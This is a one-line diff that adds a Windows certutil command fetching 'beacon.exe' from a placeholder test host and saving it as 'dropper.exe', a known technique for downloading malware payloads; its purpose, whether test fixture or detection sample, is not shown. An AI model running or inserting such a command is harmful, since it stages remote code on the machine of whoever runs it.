@@ -1,0 +1,1 @@
+certutil.exe -urlcache -split -f http://cutl-2.example.test/beacon.exe dropper.exe
